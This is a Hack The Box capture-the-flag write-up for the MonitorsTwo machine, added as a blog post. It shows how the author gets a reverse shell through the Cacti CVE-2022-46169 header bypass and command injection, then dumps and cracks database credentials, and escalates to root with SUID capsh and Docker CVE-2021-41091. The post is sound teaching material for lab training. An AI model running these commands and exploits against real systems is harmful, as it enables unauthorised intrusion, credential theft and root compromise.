@@ -1,0 +1,211 @@
+---
+title: Hack The Box - MonitorsTwo
+date: 2023-08-09 13:33:37 +0200
+categories:
+  - HTB
+tags:
+  - HTB
+comments: true
+---
+
+HTB MonitorsTwo Machine - https://www.hackthebox.com/machines/monitorstwo
+
+### Scanning & Enumeration
+Scan the HTB machine  with Nmap tool
+```
+nmap -A -Pn -p- 10.10.11.211
+```
+
+Output:
+	`22/tcp   open   ssh`
+	`80/tcp   open   http`
+
+
+Lets navigate to: http://10.10.11.211:80 page
+
+![746](/assets/img/posts/screenshot-1-png.svg)
+
+- Trying many default credential, but we got nothing
+
+### Exploitation & Gaining Access
+So lets search in google for: `cacti gorup exploit` , we will found:
+	https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/
+
+#### Vulnerability Analysis
+After reading the article, I understand the principle of the vulnerability. There are two main points:
+1. There is an unauthorized vulnerability
+2. There is a code execution vulnerability
+
+##### 1- The Unauthorized Vulnerability
+The `get_client_addr()` function in this code is to obtain the client's IP address. The way to obtain it is to read from these HTTP headers in sequence.
+After obtaining the IP, obtain the hostname and compare it with the value read in the database. If they are equal, then Can be authorized successfully
+
+![[Pasted image /assets/img/posts/20250816231535-png.svg]]
+
+These headers are under our control, we just need to add in the request to bypass detection:
+	`Forwarded-For: 127.0.0.1`
+
+And then add:
+	`GET /remote_agent.php?action=ping HTTP/1.1`
+
+##### 2- The Code Execution Vulnerability
+
+![[Pasted image /assets/img/posts/20250816231604-png.svg]]
+
+You can see that different processing requests are determined according to the action field
+
+`poll_for_data()` function exists command execution
+
+![[Pasted image /assets/img/posts/20250816231637-png.svg]]
+
+You may see that `$poller_id` is spliced ​​into the first parameter of `proc_open()`
+ 
+The first parameter is the command to be executed, so if it can be controlled by us, then any command can be executed
+
+![[Pasted image /assets/img/posts/20250816231646-png.svg]]
+
+And it can be manipulated by us, so `get_nfilter_request_var()` Use this function to filter the obtained `poller_id` instead of using `get_filter_request_var()`
+The former allows characters, while the latter only allows integers, so we can insert malicious characters here to control the executed commands
+
+#### Getting our Shell
+After search while in google for: `Cacti Version 1.2.22 exploit` , we will find
+	https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22
+
+First, open another terminal, to set our listener
+```
+nc -nvlp 444
+```
+
+Second, run the exploit 
+```
+python3 CVE-2022-46169.py -u <http://10.10.11.211/> --LHOST=10.10.16.21 --LPORT=444
+```
+
+We will got a shell
+```
+www-data@50bca5e748b0:/var/www/html$ whoami   // www-data
+```
+
+### Privilege Escalation
+Enumerate the machine
+```
+www-data@50bca5e748b0:/var/www/html$ ls -la /
+www-data@50bca5e748b0:/var/www/html$ cd /
+www-data@50bca5e748b0:/var/www/html$ cat entrypoint.sh
+```
+
+This script file gives username and password for MySQL which can allow us to get username and password for `cacti`
+	`mysql --host=db --user=root --password=root cacti -e "show tables"`
+	`user_auth may have credentials, so tried reading it.`
+	`mysql --host=db --user=root --password=root cacti -e "select * from user_auth"`
+
+
+So we will find a hashed password for user `Marcus`, which looks like `bcrypt $2*$` , `Blowfish (Unix)`
+
+Save the hash and cracked it with hashcat
+```
+hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+```
+the cracked hash results is: `funkymonkey`
+
+Then try to login with `marcus` by SSH:
+```
+ssh marcus@10.10.11.211
+Password: funkymonkey
+```
+
+We will found the user flag
+```
+ marcus@monitorstwo:~$ ls
+ marcus@monitorstwo:~$ cat user.txt
+```
+
+Know the docker version to checked for vulnerabilities:
+```
+marcus@monitorstwo:~$ docker -
+```
+
+Output:
+`docker -v \# Docker version 20.10.5+dfsg1, build 55c4c88`
+
+Check for vulnerabilities for this docker version in google, and found an exploit (CVE-2021-41091).
+	https://github.com/UncleJ4ck/CVE-2021-41091
+
+Upload the exploit on `marcus` machine from our kali, and execute it:
+```
+cd /tmp/
+scp /home/kali/Desktop/CVE-2021-41091-main/exp.sh marcus@10.10.11.211:/tmp
+Password: funkymonkey
+```
+
+Run the exploit CVE-2021-41091
+```
+marcus@monitorstwo:/tmp$ ./CVE-2021-41091.sh
+```
+
+Output:
+ `[!] Vulnerable to CVE-2021-41091`
+ `[!] Now connect to your Docker container that is accessible and obtain root access !`
+ `[>] After gaining root access execute this command (chmod u+s /bin/bash)`
+ `Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no):` 
+
+- We need to gain root access on docker to start the exploit.
+
+Search for SUID permissions
+```
+www-data@50bca5e748b0:/var/www/html$ find / -perm -u=s -type f 2>/dev/nul
+```
+ `/usr/bin/gpasswd`
+ `/usr/bin/passwd`
+ `/usr/bin/chsh`
+ `/usr/bin/chfn`
+ `/usr/bin/newgrp`
+ `/sbin/capsh`
+ `/bin/mount`
+ `/bin/umount`
+ `/bin/sul`
+
+Or
+We we can do it with: `Linpeas` script, and wee should look it under: "Files with Interesting Permissions"
+And we will choose:  `/sbin/capsh`
+
+So search in google for: `capsh privilege escalation` , we will found:
+	https://gtfobins.github.io/gtfobins/capsh/#suid
+
+From the previous user shell www-data, go to:
+```
+www-data@50bca5e748b0:/var/www/html$ ./capsh --gid=0 --uid=0 -
+www-data@50bca5e748b0:/var/www/html$ whoami        // root
+```
+
+But we need  a full root functionality, so give SUID permission to /bin/bash
+```
+chmod u+s /bin/bash
+```
+
+Run the exploit CVE-2021-41091 again
+```
+marcus@monitorstwo:/tmp$ ./CVE-2021-41091.sh
+yes
+```
+
+ `[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged`
+ `[!] Rooted !`
+ `[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged`
+ `[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'`
+ `[!] Spawning Shell`
+
+Then
+```
+ bash-5.1# exit 
+```
+
+So we will go to this `Current Vulnerable Path` , that the CVE mentioned it
+```
+cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+cd /bin
+./bash -p
+bash-5.1# whoami                  # we will be root
+bash-5.1# cd /root
+bash-5.1# cat root.txt
+```
